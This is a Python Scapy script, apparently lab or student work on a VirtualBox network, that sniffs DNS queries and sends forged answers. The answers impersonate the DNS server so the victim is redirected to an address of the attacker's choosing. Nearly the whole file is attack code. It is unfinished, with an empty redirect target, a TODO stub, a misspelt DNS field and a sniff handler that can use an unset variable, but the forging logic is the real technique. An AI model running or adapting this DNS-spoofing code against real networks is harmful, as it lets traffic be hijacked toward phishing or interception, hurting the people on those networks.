from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP, TCP
import util

networkInterface = "enp0s3"

victimIP = "192.168.56.101"
victimMAC = "08:00:27:b0:a1:ab"

serverIP = "192.168.56.102"
serverMAC = "08:00:27:c6:a4:61"

# attackerIP = get_if_addr(networkInterface)
# attackerMAC = get_if_hwaddr(networkInterface)


#input :
#catched packet which will be replaced
#host ip adresse for poisoning - target of attacker
#network interfase as string
#output:
#method will send fake dns packet , victim will think that server has replied while
#the attacker will be the one who replies to the victim

redirect_to = ""
def fake_dns_response(pkt, hostIP, networkInterface):
    hostMAC = util.getMAC(hostIP, networkInterface)
    attackerMAC = get_if_hwaddr(networkInterface)
    dns = Ether(src = attackerMAC, dst = hostMAC)/\
          IP(dst = hostIP, src = pkt[IP].dst) /\
          UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport) /\
          DNS(id = pkt[DNS].id, acount = 1, qr = 1, rd =1, qd = pkt[DNS].qd,
              an = DNSRR(rrname = pkt[DNSQR].qname, type ='A', rclass = pkt[DNSQR].qclass, ttl = 86400, rdata = redirect_to))
    dns.show()
    sendp(dns, iface = networkInterface, verbose = False)

def dns_call(pkt, hostIP, mac, networkInterface):
    #TODO


    fake_dns_response(pkt, hostIP, networkInterface)

#capture dns request and response packets
def dns_sniff(pkt):
    if pkt.haslayer('UDP') and pkt.haslayer('DNS') and pkt.haslayer('IP'):
        ip = pkt[IP].src
        if pkt.haslayer('Ether'):
            mac = pkt[Ether].src
        else :
            mac = util.getMAC(ip, networkInterface)
    dns_call(pkt, ip, mac, networkInterface)


sniff(filter = "udp port 53", iface = networkInterface, prn = dns_sniff, store = 0)